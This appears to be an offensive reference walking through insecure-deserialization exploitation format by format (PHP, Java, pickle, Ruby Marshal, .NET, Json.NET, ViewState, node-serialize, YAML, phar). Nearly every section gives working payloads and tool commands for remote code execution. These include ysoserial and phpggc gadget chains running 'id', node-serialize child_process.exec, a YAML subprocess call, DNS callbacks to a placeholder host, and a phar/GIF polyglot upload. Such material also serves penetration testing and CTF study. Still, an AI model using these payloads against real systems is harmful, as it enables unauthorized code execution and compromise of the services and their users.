# Per-Format Walk — a capture → identification → gadget → verify trace

## The point — each format, traced end to end

These are worked examples of the full loop on each format — the bytes, the
fingerprint, the corrupt-diff, the marker, the gadget, the verify. Read the
one matching your target's format.

## PHP serialize — the trace

```
blob:     Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO30=
decode:   O:4:"User":2:{s:4:"name";s:5:"admin";}
fingerprint: ^O:\d+:" → PHP serialize

corrupt:  O:4:"User":2:{s:4:"name";s:5:"admin";   (unbalanced)
  → response: "unserialize(): Error at offset 8"  → CONFIRMED unserialize

marker:   O:8:"stdClass":1:{s:5:"pwned";s:2:"X1";}
  → the object's value in the response / an error naming the class

gadget:   phpggc Monolog/RCE1 system 'id' -b  →  the POP chain
  → response/OOB carries the RCE output / the flag
```

## Java OIS — the trace

```
blob:     rO0ABXN9AAAAAaCBy...    → b64
decode:   ac ed 00 05 74 72 ...    → TC_OBJECT stream
fingerprint: aced0005 / rO0AB      → Java OIS

corrupt:  flip one byte in the classdesc
  → InvalidClassException / StreamCorruptedException → CONFIRMED readObject

marker:   java -jar ysoserial.jar URLDNS http://x.YOU/
  → DNS callback → CONFIRMED readObject ran (JDK-only, zero deps)

fingerprint the classpath:
  → a probe class → ClassNotFoundException names the resolved state
  → OR GadgetProbe per-lib probes

gadget:   java -jar ysoserial.jar CommonsCollections6 'id' >cc.ser
  → callback / response carrying the RCE output
```

## Python pickle — the trace

```
blob:     gANjbnQKc3lzdGVt...     → b64
decode:   \x80\x03cnt\nsystem\n... → opcodes
fingerprint: \x80\x03 / gAN        → pickle p3

corrupt:  \x80\x03c               → truncated
  → _pickle.UnpicklingError: pickle data was truncated → CONFIRMED loads

marker:   python3 tools/pickle_gen.py --marker X1 → PWNED_X1 object
  → the marker string / a find_class error naming it → CONFIRMED

gadget:   python3 tools/pickle_gen.py --cmd 'id' --protocol 0
  → the RCE output in the response, OR an OOB fetch carrying it
```

## Ruby Marshal — the trace

```
blob:     BAhvOiRTb21lQ2xhc3...   → b64
decode:   \x04\x08o:\x13...       → Marshal 4.8
fingerprint: \x04\x08 / BAh        → Marshal

corrupt:  \x04\x08\xff            → bad type tag
  → ArgumentError: dump format error → CONFIRMED Marshal.load

gadget:   the universal-ERB proxy graph for the Rails version
  → ERB result → the RCE output / OOB
```

## .NET BinaryFormatter — the trace

```
blob:     AAEAAAD/////AQAAAA...   → b64
decode:   00 01 00 00 00 FF FF FF FF 01 ... → BinaryFormatter
fingerprint: AAEAAAD / 00 01 00 00 00 FF → BinaryFormatter

corrupt:  drop a byte of the tail
  → SerializationException: End of Stream → CONFIRMED Deserialize

gadget:   ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c 'cmd /c id' -o base64
  → the response/OOB proving the exec
```

## Json.NET `$type` — the trace

```
body:     {"$type":"System.Diagnostics.Process","StartInfo":{...}}
fingerprint: {"$type": → Json.NET TypeNameHandling

corrupt:  {"$type":"Attacker.Probe, X"}
  → JsonException: Error resolving type 'Attacker.Probe, X' → TypeNameHandling CONFIRMED

gadget:   ysoserial.exe -g ObjectDataProvider -f Json.Net -c 'cmd /c id' -o base64
```

## ViewState — the trace

```
field:    __VIEWSTATE=/wEPDwUK...
fingerprint: /wEP → LosFormatter+MAC

key hunt: web.config/machineKey leak → ysoserial.net -p ViewState ...
gadget:   TextFormattingRunProperties + the machineKey args
```

## node-serialize — the trace

```
field:    {"x":"_$$ND_FUNC$$_..."} or a normal JSON the app unserializes
fingerprint: _$$ND_FUNC$$_ → node-serialize

probe:    {"x":"_$$ND_FUNC$$_function(){require('dns').lookup('x.YOU')}()"}
  → DNS callback → confirmed revive+invoke

gadget:   {"x":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
```

## YAML — the trace

```
body:     --- !!python/object:...    or   !!javax...    or   !ruby/object:
fingerprint: !! / !ruby/ → typed YAML tag

corrupt:  !!python/object:does.not.Exist {x:1}
  → ConstructorException → typed-tag load CONFIRMED

gadget:   !!python/object/apply:subprocess.check_output [['id']]
          !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [...]]]]
```

## phar:// — the trace

```
upload:   archive_gen phar --metadata '<ser>' → x.jpg (GIF+phar polyglot)
stored:   uploads/x.jpg
trigger:  file_exists('phar://uploads/x.jpg/x')  → metadata deserializes
confirm:  the chain's sink output / an error naming a class
```

## The invariant — every trace is the same six steps

```
decode → fingerprint → corrupt-diff → marker/OOB → version → gadget → verify
```

The format only changes WHICH bytes are the magic and WHICH generator mints
the gadget — the prove-it loop is identical.
